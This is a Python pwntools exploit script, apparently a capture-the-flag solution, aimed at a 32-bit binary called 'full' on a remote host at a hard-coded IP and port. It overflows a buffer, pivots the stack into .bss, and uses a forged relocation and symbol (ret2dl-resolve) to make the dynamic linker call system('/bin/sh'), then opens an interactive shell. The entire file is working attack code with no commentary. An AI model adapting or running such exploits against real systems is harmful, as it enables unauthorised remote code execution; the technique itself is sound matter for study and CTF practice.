#!/usr/bin/python
#coding:utf-8
from pwn import *
elf = ELF('full')
read_plt = elf.plt['read']
memcpy_plt = elf.plt['memcpy']

ppp_ret = 0x08048519
pop_ebp_ret = 0x0804851b
leave_ret = 0x080483c5
stack_size = 0x800
bss_addr = 0x0804a020
base_stage = bss_addr + stack_size

r = remote('39.96.88.40',7050)
payload = 'A' * 14 + p32(0x804a044 + 18)
payload += p32(read_plt)
payload += p32(ppp_ret)
payload += p32(0)
payload += p32(base_stage)
payload += p32(100)
payload += p32(pop_ebp_ret)
payload += p32(base_stage)
payload += p32(leave_ret)
r.send(payload)

cmd = "/bin/sh"
plt_0 = 0x080482f0
rel_plt = 0x080482b4
index_offset = (base_stage + 28) - rel_plt

read_got = elf.got['read']

dynsym = 0x080481cc
dynstr = 0x0804822c

fake_sym_addr = base_stage + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
r_info = (index_dynsym << 8) | 0x7
fake_reloc = p32(read_got) + p32(r_info)
st_name = (fake_sym_addr + 16) - dynstr
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

payload2 = 'aaaa'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += 'aaaa'
payload2 += p32(base_stage + 80)
payload2 += 'aaaa'
payload2 += 'aaaa'
payload2 += fake_reloc
payload2 += 'a' * align
payload2 += fake_sym 
payload2 += "system\x00"
payload2 += 'a' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'a' * (100 - len(payload2))
r.send(payload2)
r.interactive()